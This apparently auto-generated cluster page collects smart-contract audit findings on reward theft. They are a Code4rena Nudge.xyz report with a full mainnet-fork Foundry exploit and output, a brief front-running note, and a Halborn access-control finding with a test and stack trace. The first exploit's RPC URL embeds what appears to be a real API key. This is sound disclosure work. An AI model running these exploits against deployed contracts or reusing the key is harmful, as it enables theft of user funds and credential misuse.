# Cluster -1144

**Rank:** #333  
**Count:** 20  

## Label
Insufficient input validation and improper state checks enable attackers to claim rewards multiple times or redirect rewards to unauthorized addresses, leading to reward theft and financial loss.

## Cluster Information
- **Total Findings:** 20

## Examples

### Example 1

**Auto Label:** Insufficient input validation and improper state checks enable attackers to claim rewards multiple times or redirect rewards to unauthorized addresses, leading to reward theft and financial loss.  

**Original Text Preview:**

<https://github.com/code-423n4/2025-03-nudgexyz/blob/main/src/campaign/NudgeCampaign.sol# L164-L233>

<https://github.com/code-423n4/2025-03-nudgexyz/blob/main/src/campaign/NudgeCampaign.sol# L308-L321>

### Summary

The `NudgeCampaign::handleReallocation` function allows any attacker to manipulate reward allocations through flash loans or repeated calls with real fund via Li.Fi’s executor. This can lead to reward depletion and disruption of legitimate user rewards even after invalidating the attacker

### Vulnerability Details

The vulnerability stems from two main issues:

1. **Insufficient Caller Validation**: While the function checks for `SWAP_CALLER_ROLE`, this role is assigned to Li.Fi’s executor which can be called by anyone, effectively bypassing intended access controls.
2. **Reward Accounting Flaw**: The system fails to properly reset claimable amounts when participations are invalidated, allowing attackers to:

   * Claim all allocations through flash loans
   * Perform repeated reallocations via Li.Fi’s executor
   * Cause permanent reduction of available rewards through multiple invalidations

The `invalidateParticipations` function only subtracts from `pendingRewards` but doesn’t return the fees to the claimable pool, creating a growing discrepancy in reward accounting.

### Proof of Concept

Here is a test to prove this. This was run in mainnet fork. Since this will be deployed on Ethereum and other L2s in from the doc. Create a new test file and add this to the test suite `src/test/NudgeCampaignAttackTest.t.sol`.
```

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import { Test, console } from "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";
import { NudgeCampaign } from "../campaign/NudgeCampaign.sol";
import { NudgeCampaignFactory } from "../campaign/NudgeCampaignFactory.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { FlashLoanAttackContract } from "./FlashLoanAttackContractTest.t.sol";
import { IBaseNudgeCampaign } from "../campaign/interfaces/INudgeCampaign.sol";

library LibSwap {
  struct SwapData {
    address callTo;
    address approveTo;
    address sendingAssetId;
    address receivingAssetId;
    uint256 fromAmount;
    bytes callData;
    bool requiresDeposit;
  }
}

interface ILifiExecutor is IERC20 {
  function erc20Proxy() external view returns (address);
  function swapAndExecute(
    bytes32 _transactionId,
    LibSwap.SwapData[] calldata _swapData,
    address _transferredAssetId,
    address payable _receiver,
    uint256 _amount
  )
    external
    payable;
}

contract NudgeCampaignAttackTest is Test {
  NudgeCampaign private campaign;
  address NATIVE_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
  address owner;
  uint256 constant REWARD_PPQ = 2e13;
  uint256 constant INITIAL_FUNDING = 100_000e18;
  address campaignAdmin = address(14);
  address nudgeAdmin = address(15);
  address treasury = address(16);
  address operator = address(17);
  address alternativeWithdrawalAddress = address(16);
  address campaignAddress;
  uint32 holdingPeriodInSeconds = 60 * 60 * 24 * 7; // 7 days
  uint256 rewardPPQ = 2e13;
  uint256 RANDOM_UUID = 111_222_333_444_555_666_777;
  uint16 DEFAULT_FEE_BPS = 1000;
  NudgeCampaignFactory factory;
  address constant SWAP_CALLER = 0x2dfaDAB8266483beD9Fd9A292Ce56596a2D1378D; //LIFI EXECUTOR
  string constant MAINNET_RPC_URL = "https://eth-mainnet.g.alchemy.com/v2/j7SKDcG36WqFJxaAGYTsKo6IIDFSmFhl";
  IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); //rewardToken
  IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); //toToken
  ILifiExecutor constant LIFI_EXECUTOR = ILifiExecutor(0x2dfaDAB8266483beD9Fd9A292Ce56596a2D1378D);

  FlashLoanAttackContract flashLoanAttackContract;
  address attacker = makeAddr("Attacker");
  uint256[] pIDsWithOne = [1];

  function setUp() public {
    vm.createSelectFork(MAINNET_RPC_URL);

    owner = msg.sender;

    factory = new NudgeCampaignFactory(treasury, nudgeAdmin, operator, SWAP_CALLER);

    campaignAddress = factory.deployCampaign(
      holdingPeriodInSeconds,
      address(DAI),
      address(WETH),
      REWARD_PPQ,
      campaignAdmin,
      0,
      alternativeWithdrawalAddress,
      RANDOM_UUID
    );
    campaign = NudgeCampaign(payable(campaignAddress));

    flashLoanAttackContract = new FlashLoanAttackContract(campaign);

    vm.deal(campaignAdmin, 10 ether);

    deal(address(WETH), campaignAdmin, 10_000_000e18);

    vm.prank(campaignAdmin);
    WETH.transfer(campaignAddress, INITIAL_FUNDING);
  }

  function deployCampaign(address DAI_, address WETH_, uint256 rewardPPQ_) internal returns (NudgeCampaign) {
    campaignAddress = factory.deployCampaign(
      holdingPeriodInSeconds, DAI_, WETH_, rewardPPQ_, campaignAdmin, 0, alternativeWithdrawalAddress, RANDOM_UUID
    );
    campaign = NudgeCampaign(payable(campaignAddress));

    return campaign;
  }

function test_attackReallocationTest() public {
    uint256 count;
      uint256 toAmount = 300_768e18;
    deal(address(DAI), attacker, toAmount);

    while (campaign.claimableRewardAmount() > 6000e18) {
      pIDsWithOne[0] = count + 1;
      bytes memory dataToCall = abi.encodeWithSelector(
        campaign.handleReallocation.selector, RANDOM_UUID, address(SWAP_CALLER), address(DAI), toAmount, ""
      );
      bytes32 transactionId = keccak256(abi.encode(DAI, block.timestamp, tx.origin));
      LibSwap.SwapData[] memory swapData = new LibSwap.SwapData[](1);
      swapData[0] =
        LibSwap.SwapData(address(campaign), address(campaign), address(DAI), address(DAI), toAmount, dataToCall, false);

      uint256 gasStart = gasleft();
      vm.startPrank(attacker);
      IERC20(DAI).approve(LIFI_EXECUTOR.erc20Proxy(), toAmount);

      LIFI_EXECUTOR.swapAndExecute(transactionId, swapData, address(DAI), payable(attacker), toAmount);
      vm.stopPrank();
      uint256 gasEnd = gasleft();
      if (count == 0) {
        console.log("Gas used per attack = ", gasStart - gasEnd);
      }

      vm.prank(operator);
      campaign.invalidateParticipations(pIDsWithOne);
      count++;
    }

    uint256 newClaimableReward = campaign.claimableRewardAmount();
    console.log("Final Claimable Reward:", newClaimableReward);
    console.log("Number of times attack ran", count);

  }
}
```

Then run with `forge test --mt test_attackReallocationTest -vvv`. Here is the result:
```

 forge test --mt test_attackReallocationTest -vvv
[⠰] Compiling...
[⠔] Compiling 1 files with Solc 0.8.28
[⠒] Solc 0.8.28 finished in 4.06s
Compiler run successful!

Ran 1 test for src/test/NudgeCampaignAttackTest.t.sol:NudgeCampaignAttackTest
[PASS] test_attackReallocationTest() (gas: 40900516)
Logs:
  Gas used per attack =  432808
  Final Claimable Reward: 5558848000000000000000
  Number of times attack ran 157

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.94s (3.72s CPU time)

Ran 1 test suite in 10.96s (10.94s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

* Gas used per attack: 432808
* Attack ran 157 times
* Total gas: `432808 * 157 = 67950856`
  With the current Ethereum gas price of 0.701 gwei per gas, it’ll cost 0.`701 * 67950856` gwei = 47633550.056 gwei
* This is 0.0476 Ether (Current Ether price is `$2087`). `2087 * 0.0476 = $99.34`
* It cost about `$99.34` in gas to launch the attack. This will be cheaper on L2, making this attack very possible.

### Impact

This vulnerability allows attackers to:

* Maliciously allocate campaign rewards through flash loans
* Perform denial-of-service attacks on legitimate users’ rewards
* Permanently reduce available rewards through repeated invalidations
* Disrupt the intended economic model of the campaign system

The attack could be executed at minimal cost and would be difficult to detect until rewards are significantly depleted.

### Tools Used

Foundry

### Recommended mitigation steps

Fix reward accounting:
```

function invalidateParticipations(uint256[] calldata pIDs) external onlyNudgeOperator {
    for (uint256 i = 0; i < pIDs.length; i++) {
        Participation storage participation = participations[pIDs[i]];

        if (participation.status != ParticipationStatus.PARTICIPATING) {
            continue;
        }

        participation.status = ParticipationStatus.INVALIDATED;
        uint256 totalReward = participation.rewardAmount +
                            (participation.rewardAmount * feeBasisPoints / BASIS_POINTS);
        pendingRewards -= participation.rewardAmount;
        claimableRewards += totalReward; // Add to claimable pool
    }
    emit ParticipationInvalidated(pIDs);
}
```

**raphael (Nudge.xyz) confirmed**

---

---
### Example 2

**Auto Label:** Arithmetic overflows and improper validation enable attackers to freeze funds or manipulate rewards, leading to loss of user assets and undermined incentive mechanisms.  

**Original Text Preview:**

The WstUSR vault allows users to deposit and withdraw within the same block. This enables malicious users to monitor the mempool and front-run the reward distribution by making a large deposit, and then withdrawing within the same block, which allows them to siphon off a portion of the rewards. To mitigate this vulnerability, consider enforcing a delay between deposits and withdrawals.

---
### Example 3

**Auto Label:** Insufficient input validation and improper state checks enable attackers to claim rewards multiple times or redirect rewards to unauthorized addresses, leading to reward theft and financial loss.  

**Original Text Preview:**

##### Description

In the `RewardDistributor` smart contract, functions like `updateEpoch` and `updateAccountReward` directly influence the financial integrity of the contract by affecting how rewards are computed and claimed. Leaving these functions without stringent access control or with restricted visibility could expose the contract to risks of state corruption or unintended financial discrepancies.

![Execution flow of `claimReward` function in `RewardDistributor` contract](https://halbornmainframe.com/proxy/audits/images/663aa272051a2fe55cbd3090)  

Both functions are called within the execution flow of the `claimReward` function in the `RewardDistributor`, and also in the `VeQoda` contract, which interacts with `RewardDistributor` through the `_updateReward` function, which calls `updateAccountReward` on each reward distributor registered in the `_rewardDistributors` set.

**- Function** `claimReward` - **src/RewardDistributor.sol [Lines: 126-143]**

```
    /// @notice Claim reward up till min(epochTarget, epochCurrent). Claiming on behalf of another person is allowed.
    /// @param account Account address which reward will be claimed
    /// @param epochTarget Ending epoch that account can claim up till, parameter exposed so that claiming can be done in step-wise manner to avoid gas limit breach
    function claimReward(address account, uint256 epochTarget) external {
        // Update unclaimed reward for an account before triggering reward transfer
        updateAccountReward(account, epochTarget);

        StakingStructs.AccountReward storage accountReward = accountRewards[account];
        if (accountReward.unclaimedReward > 0) {
            // Reset unclaimed reward before transfer to avoid re-entrancy attack
            uint256 reward = accountReward.unclaimedReward;
            accountReward.unclaimedReward = 0;
            IERC20(token).safeTransfer(account, reward);
            accountReward.claimedReward += reward;

            emit ClaimReward(account, epochTarget, reward);
        }
    }
```

  

**- Function** `updateAccountReward` **- src/RewardDistributor.sol [Lines: 176-194]**

```
    /// @notice Function to be called BEFORE veToken balance change for an account. Reward for an account will go into pendingReward
    /// @param account Account address for reward update to happen
    /// @param epochTarget Ending epoch that account reward can be updated up till, parameter exposed so that claiming can be done in step-wise manner to avoid gas limit breach
    function updateAccountReward(address account, uint256 epochTarget) public {
        // Update current epoch number if needed
        updateEpoch(epochTarget);

        // Make sure user cannot claim reward in the future
        if (epochTarget > epochCurrent) {
            epochTarget = epochCurrent;
        }

        // Calculate unclaimed reward
        uint256 unclaimedReward = getUnclaimedReward(account, epochTarget);

        StakingStructs.AccountReward storage reward = accountRewards[account];
        reward.unclaimedReward = unclaimedReward;
        reward.lastUpdateEpoch = epochTarget;
    }
```

  

**- Function** `updateEpoch` **- src/RewardDistributor.sol [Lines: 145-174]**

```
    /// @notice Check if it is first interaction after epoch starts, and fix amount of total ve token participated in previous epoch if so
    /// @param epochTarget Ending epoch that update will happen up till, parameter exposed so that update can be done in step-wise manner to avoid gas limit breach
    function updateEpoch(uint256 epochTarget) public {
        // Determine what epoch is current time in
        uint256 epochCurrentNew = getEpoch(block.timestamp);

        // If new epoch is on or before current epoch, either contract has not kick-started,
        // or this is not first interaction since epoch starts
        if (epochCurrentNew <= epochCurrent) {
            return;
        }

        // Epoch for current time now has surpassed target epoch, so limit epoch number
        if (epochCurrentNew > epochTarget) {
            epochCurrentNew = epochTarget;
        }

        // Take snapshot of total veToken since this is the first transaction in an epoch
        for (uint256 epoch = epochCurrent + 1; epoch <= epochCurrentNew;) {
            uint256 timeAtEpoch = getTimestamp(epoch);
            uint256 totalSupply = IVeQoda(veToken).totalVe(timeAtEpoch);
            totalVe.push(totalSupply);
            unchecked {
                epoch++;
            }
            // One emission for each epoch
            emit EpochUpdate(epoch, timeAtEpoch, totalSupply);
        }
        epochCurrent = epochCurrentNew;
    }
```

  

From the code snippets of the `RewardDistributor` contract, it is possible to observe that the functions `updateEpoch` and `updateAccountRewards` are not supposed to be called alone, but within the execution of the `claimReward` function.

Likewise, in the `VeQoda` Token contract, when users are interacting with the `stake` and `unstake` functions, they will call the internal `_updateReward` function in the `VeQoda` contract, that subsequently performs an external call to the `updateAccountReward` public function in the `RewardDistributor` contract.

**- Function** `stake` **- src/VeQoda.sol [Lines: 80-127]**

```
    /// @notice Stake token into contract
    /// @param account Account address for receiving staking reward
    /// @param method Staking method account used for staking
    /// @param amount Amount of token to stake
    function stake(address account, bytes32 method, uint256 amount) external {
        if (amount <= 0) {
            revert CustomErrors.ZeroStakeAmount();
        }

        // Calculate unclaimed reward before balance update
        _updateReward(account);

        // if user exists, first update their cached veToken balance
        if (_users.contains(account)) {
            _updateVeTokenCache(account);
        }

        // Do token transfer from user to contract
        address token = _methodInfo[method].token;
        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);

        // If user not exists before, create user info and add it to an array
        if (!_users.contains(account)) {
            _users.add(account);
        }

        // Update method info, all methods already has lastUpdateSec = block.timestamp in previous update, so only consider the newly added
        StakingStructs.StakingInfo storage info = _userInfo[account][method];
        StakingStructs.VeEmissionInfo[] storage veEmissions = _methodInfo[method].veEmissions;
        uint256 veEmissionLength = veEmissions.length;
        for (uint256 i = 0; i < veEmissionLength;) {
            // Time should be bounded by effective start and end time for current emission
            uint256 effectiveEnd = i < veEmissionLength - 1? veEmissions[i + 1].vePerDayEffective: type(uint256).max;
            uint256 time = _bounded(block.timestamp, veEmissions[i].vePerDayEffective, effectiveEnd);
            veEmissions[i].tokenAmount += amount;
            veEmissions[i].tokenAmountTime += amount * time;
            unchecked {
                i++;
            }
        }

        // Update user info
        info.amount += amount;
        info.lastUpdateSec = block.timestamp;

        // Emit the event
        emit Stake(account, method, token, amount);
    }
```

  

**- Function** `unstake` **- src/VeQoda.sol [Lines: 129-206]**

```
    /// @notice Unstake tokens, note that you will lose ALL your veToken if you unstake ANY amount with either method
    /// So to protect account interest, only sender can unstake, neither admin nor support can act on behalf in this process
    /// @param method Staking method user wish to unstake from
    /// @param amount Amount of tokens to unstake
    function unstake(bytes32 method, uint256 amount) external {
        if (amount <= 0) {
            revert CustomErrors.ZeroUnstakeAmount();
        }

        // User cannot over-unstake
        if (_userInfo[msg.sender][method].amount < amount) {
            revert CustomErrors.InsufficientBalance();
        }

        // Calculate unclaimed reward before balance update
        _updateReward(msg.sender);

        // Reset user ve balance to 0 across all methods
        bool userStaked = false;
        uint256 methodsLength = _methods.length();
        for (uint256 i = 0; i < methodsLength;) {
            bytes32 methodBytes = _methods.at(i);

            StakingStructs.StakingInfo storage info = _userInfo[msg.sender][methodBytes];
            StakingStructs.MethodInfo storage methodInfo_ = _methodInfo[methodBytes];

            // Update method ve balance
            methodInfo_.totalVe -= info.amountVe;
            
            // For target staked method, reduce token amount across all ve emissions
            StakingStructs.VeEmissionInfo[] storage veEmissions = methodInfo_.veEmissions;
            uint256 veEmissionLength = veEmissions.length;
            for (uint256 j = 0; j < veEmissionLength;) {
                // Time should be bounded by effective start and end time for current emission
                uint256 effectiveEnd = j < veEmissionLength - 1? veEmissions[j + 1].vePerDayEffective: type(uint256).max;
                uint256 lastUpdateSec = _bounded(info.lastUpdateSec, veEmissions[j].vePerDayEffective, effectiveEnd);
                uint256 time = _bounded(block.timestamp, veEmissions[j].vePerDayEffective, effectiveEnd);

                if (methodBytes == method) {
                    // update token amount and timestamp-related cached value
                    veEmissions[j].tokenAmountTime -= info.amount * lastUpdateSec - (info.amount - amount) * block.timestamp;
                    veEmissions[j].tokenAmount -= amount;
                } else {
                    // update timestamp-related cached value
                    veEmissions[j].tokenAmountTime -= info.amount * (time - lastUpdateSec);
                }
                unchecked {
                    j++;
                }
            }

            // Update account balance and last update time
            info.amountVe = 0;
            info.lastUpdateSec = block.timestamp;
            if (methodBytes == method) {
                info.amount -= amount;
            }
            if (info.amount > 0) {
                userStaked = true;
            }

            unchecked {
                i++;
            }
        }

        // If user no longer stakes, remove user from array
        if (!userStaked) {
            _users.remove(msg.sender);
        }

        // Send back the withdrawn underlying
        address token = _methodInfo[method].token;
        IERC20(token).safeTransfer(msg.sender, amount);

        // Emit the event
        emit Unstake(msg.sender, method, token, amount);
    }
```

  

**- Function** `_updateReward` **- src/VeQoda.sol [Lines: 387-398]**

```
    /// @notice Function to be called to claim reward up to latest before making any ve balance change
    /// @param account Account address for receiving reward
    function _updateReward(address account) internal {
        uint256 rewardDistributorsLength = _rewardDistributors.length();
        for (uint256 i = 0; i < rewardDistributorsLength;) {
            address rewardDistributor = _rewardDistributors.at(i);
            IRewardDistributor(rewardDistributor).updateAccountReward(account, type(uint256).max);
            unchecked {
                i++;
            }
        }
    }
```

  

The identified vulnerabilities allow a malicious actor to invoke these unprotected functions arbitrarily, potentially leading to unauthorized manipulation of epoch management and reward calculations. This exploitation could result in several detrimental outcomes:

1. **Epoch Manipulation:** By calling `updateEpoch` without proper checks, an attacker could force the system into a new epoch prematurely, disrupting the intended timing for reward calculations and distributions. This premature transition could invalidate the correctness of ongoing epoch-based reward distributions, affecting all participating users.
2. **Reward Calculation Errors:** Unauthorized access to `updateAccountReward` could allow an attacker to repeatedly update reward accounts, potentially recalculating and claiming rewards based on manipulated or falsely reported staking data. This could lead to incorrect reward payouts, either denying rightful rewards to legitimate users or falsely inflating rewards to certain accounts.
3. **Impact on VeQoda Contract:** Since `VeQoda` relies on the integrity of the `RewardDistributor` for accurate veToken calculations and reward distributions, compromising the `RewardDistributor` directly affects the `VeQoda` contract's ability to maintain a reliable and trusted token supply and staking mechanism.
4. **Financial and Reputational Damage:** Beyond the immediate impact on token management and reward distributions, exploiting these vulnerabilities could lead to financial losses for users and damage the trust and reliability perceived in the platform, potentially causing long-term reputational harm to the project.
5. **System-Wide Inconsistencies:** Continuous exploitation of these vulnerabilities could lead to widespread inconsistencies across the staking and reward systems, making it challenging to restore integrity and confidence without significant rollback or system-wide updates, which may include pausing the contract, upgrading, or even a complete redeployment.

##### Proof of Concept

In order to reproduce this vulnerability, a simple call to `updateEpoch` and `updateAccountRewards` by a malicious actor would suffice to exploit the contract state and lead to undesired reward distribution and accounting.

**- Foundry test**

```
    function test_RewardDistributor_missing_access_control() public {
        vm.startPrank(seraph);
        /// calls `updateEpoch` with the current unix
        /// timestamp for the epoch.
        reward_distributor.updateEpoch(1715207594);
        /// calls `updateAccountReward` passing another
        /// user (ghost) and epoch `0` as parameters.
        reward_distributor.updateAccountReward(ghost, 0);
        vm.stopPrank();
    }
```

  

**- Stack traces**

```
  [273596] Halborn_QodaToken_test_Unit::test_RewardDistributor_missing_access_control()
    ├─ [0] VM::startPrank(0x4CCeBa2d7D2B4fdcE4304d3e09a1fea9fbEb1528)
    │   └─ ← [Return] 
    ├─ [251605] TransparentUpgradeableProxy::updateEpoch(1715207594 [1.715e9])
    │   ├─ [246660] RewardDistributor::updateEpoch(1715207594 [1.715e9]) [delegatecall]
    │   │   ├─ [46493] TransparentUpgradeableProxy::totalVe(1704067200 [1.704e9]) [staticcall]
    │   │   │   ├─ [41545] VeQoda::totalVe(1704067200 [1.704e9]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ emit EpochUpdate(epochNumber: 2, epochStartTime: 1704067200 [1.704e9], totalSupply: 0)
    │   │   ├─ [7993] TransparentUpgradeableProxy::totalVe(1704931200 [1.704e9]) [staticcall]
    │   │   │   ├─ [7545] VeQoda::totalVe(1704931200 [1.704e9]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ emit EpochUpdate(epochNumber: 3, epochStartTime: 1704931200 [1.704e9], totalSupply: 0)
    │   │   ├─ [7993] TransparentUpgradeableProxy::totalVe(1705795200 [1.705e9]) [staticcall]
    │   │   │   ├─ [7545] VeQoda::totalVe(1705795200 [1.705e9]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ emit EpochUpdate(epochNumber: 4, epochStartTime: 1705795200 [1.705e9], totalSupply: 0)
    │   │   ├─ [7993] TransparentUpgradeableProxy::totalVe(1706659200 [1.706e9]) [staticcall]
    │   │   │   ├─ [7545] VeQoda::totalVe(1706659200 [1.706e9]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ emit EpochUpdate(epochNumber: 5, epochStartTime: 1706659200 [1.706e9], totalSupply: 0)
    │   │   ├─ [7993] TransparentUpgradeableProxy::totalVe(1707523200 [1.707e9]) [staticcall]
    │   │   │   ├─ [7545] VeQoda::totalVe(1707523200 [1.707e9]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ emit EpochUpdate(epochNumber: 6, epochStartTime: 1707523200 [1.707e9], totalSupply: 0)
    │   │   ├─ [7993] TransparentUpgradeableProxy::totalVe(1708387200 [1.708e9]) [staticcall]
    │   │   │   ├─ [7545] VeQoda::totalVe(1708387200 [1.708e9]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ emit EpochUpdate(epochNumber: 7, epochStartTime: 1708387200 [1.708e9], totalSupply: 0)
    │   │   ├─ [7993] TransparentUpgradeableProxy::totalVe(1709251200 [1.709e9]) [staticcall]
    │   │   │   ├─ [7545] VeQoda::totalVe(1709251200 [1.709e9]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ emit EpochUpdate(epochNumber: 8, epochStartTime: 1709251200 [1.709e9], totalSupply: 0)
    │   │   ├─ [7993] TransparentUpgradeableProxy::totalVe(1710115200 [1.71e9]) [staticcall]
    │   │   │   ├─ [7545] VeQoda::totalVe(1710115200 [1.71e9]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ emit EpochUpdate(epochNumber: 9, epochStartTime: 1710115200 [1.71e9], totalSupply: 0)
    │   │   ├─ [7993] TransparentUpgradeableProxy::totalVe(1710979200 [1.71e9]) [staticcall]
    │   │   │   ├─ [7545] VeQoda::totalVe(1710979200 [1.71e9]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ emit EpochUpdate(epochNumber: 10, epochStartTime: 1710979200 [1.71e9], totalSupply: 0)
    │   │   ├─ [7993] TransparentUpgradeableProxy::totalVe(1711843200 [1.711e9]) [staticcall]
    │   │   │   ├─ [7545] VeQoda::totalVe(1711843200 [1.711e9]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ emit EpochUpdate(epochNumber: 11, epochStartTime: 1711843200 [1.711e9], totalSupply: 0)
    │   │   ├─ [7993] TransparentUpgradeableProxy::totalVe(1712707200 [1.712e9]) [staticcall]
    │   │   │   ├─ [7545] VeQoda::totalVe(1712707200 [1.712e9]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ emit EpochUpdate(epochNumber: 12, epochStartTime: 1712707200 [1.712e9], totalSupply: 0)
    │   │   ├─ [7993] TransparentUpgradeableProxy::totalVe(1713571200 [1.713e9]) [staticcall]
    │   │   │   ├─ [7545] VeQoda::totalVe(1713571200 [1.713e9]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ emit EpochUpdate(epochNumber: 13, epochStartTime: 1713571200 [1.713e9], totalSupply: 0)
    │   │   ├─ [7993] TransparentUpgradeableProxy::totalVe(1714435200 [1.714e9]) [staticcall]
    │   │   │   ├─ [7545] VeQoda::totalVe(1714435200 [1.714e9]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ emit EpochUpdate(epochNumber: 14, epochStartTime: 1714435200 [1.714e9], totalSupply: 0)
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [8745] TransparentUpgradeableProxy::updateAccountReward(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, 0)
    │   ├─ [8297] RewardDistributor::updateAccountReward(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, 0) [delegatecall]
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 
```

##### BVSS

[AO:A/AC:L/AX:L/R:N/S:U/C:N/A:N/I:M/D:L/Y:L (6.3)](/bvss?q=AO:A/AC:L/AX:L/R:N/S:U/C:N/A:N/I:M/D:L/Y:L)

##### Recommendation

To completely address the current issue with access control, the following modifications are recommended:

1. Change the visibility modifier of the current `updateAccountReward` and `updateEpoch` functions to `internal` or `private`, and also rename the functions to `_updateAccountReward` and `_updateEpoch`, to keep consistency with general convention for `internal` or `private` functions.
2. Create two **new external functions (entry points)**, that will redirect incoming calls to the internal `_updateAccountReward` and `_updateReward` functions. Name these functions `updateAccountReward` and `updateEpoch`, and make sure that they can be externally called by the `VeQoda` contract. These external entry points must be access-controlled, so only authorized addresses (such as `VeQoda` token) can call it. Consider creating a modifier `onlyVeQoda` that will perform this verification.

  

### Remediation Plan

**RISK ACCEPTED:** The risk associated with this finding was accepted.

---
